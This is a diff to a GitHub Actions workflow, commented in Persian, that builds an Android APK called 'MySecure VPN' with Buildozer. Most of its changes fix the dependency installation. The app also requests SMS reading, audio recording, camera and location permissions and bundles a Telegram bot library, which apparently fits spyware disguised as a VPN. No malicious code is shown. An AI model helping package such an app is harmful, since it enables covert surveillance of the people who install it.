@@ -17,12 +17,16 @@ jobs:
       with:
         python-version: '3.12'
 
-    - name: نصب مواد
+    - name: نصب مواد (با فیکس ارور)
       run: |
-        sudo apt update
-        sudo apt install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev
-        pip install --upgrade Cython==0.29.33 virtualenv buildozer
-        sudo apt install -y build-essential libsqlite3-dev sqlite3 bzip2 libbz2-dev zlib1g-dev libssl-dev openssl libgdbm-dev libgdbm-compat-dev liblzma-dev libreadline-dev libncursesw5-dev libffi-dev uuid-dev libffi6
+        set -e  # متوقف شو اگر ارور
+        sudo apt update -qq  # بروزرسانی ساکت
+        sudo apt install -y --no-install-recommends git zip unzip openjdk-17-jdk-headless python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev
+        pip install --upgrade pip setuptools wheel
+        pip install Cython<3.0 virtualenv buildozer  # Cython 0.29.x بدون نسخه دقیق
+        sudo apt update -qq  # دوباره برای Kivy deps
+        sudo apt install -y --no-install-recommends build-essential libsqlite3-dev sqlite3 bzip2 libbz2-dev zlib1g-dev libssl-dev openssl libgdbm-dev libgdbm-compat-dev liblzma-dev libreadline-dev libncursesw5-dev libffi-dev uuid-dev libffi6 libgl1-mesa-dev libgles2-mesa-dev
+        echo "نصب deps تموم شد"  # لاگ برای چک
 
     - name: بپز APK
       run: |
@@ -30,16 +34,19 @@ jobs:
         sed -i 's/title = My Application/title = MySecure VPN/' buildozer.spec
         sed -i 's/package.name = myapp/package.name = mysecurevpn/' buildozer.spec
         sed -i 's/package.domain = org.example/package.domain = org.example.vpn/' buildozer.spec
-        sed -i 's/requirements = python3,kivy/requirements = python3,kivy==2.3.0,plyer,pyTelegramBotAPI,requests/' buildozer.spec
+        sed -i 's/requirements = python3,kivy/requirements = python3,kivy==2.1.0,plyer,pyTelegramBotAPI,requests/' buildozer.spec  # Kivy 2.1.0 برای سازگاری
         sed -i 's/android.permissions = INTERNET/android.permissions = INTERNET,ACCESS_FINE_LOCATION,CAMERA,RECORD_AUDIO,READ_SMS,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE/' buildozer.spec
         sed -i 's/android.api = 27/android.api = 33/' buildozer.spec
         sed -i 's/android.minapi = 21/android.minapi = 21/' buildozer.spec
         sed -i 's/android.sdk = 20/android.sdk = 33/' buildozer.spec
         sed -i 's/android.ndk = 19b/android.ndk = 25c/' buildozer.spec
         buildozer android debug
+      env:
+        ANDROID_SDK_ROOT: $ANDROID_HOME  # اگر لازم
 
     - name: بده APK
       uses: actions/upload-artifact@v4
       with:
         name: apk
         path: bin/*.apk
+        retention-days: 30
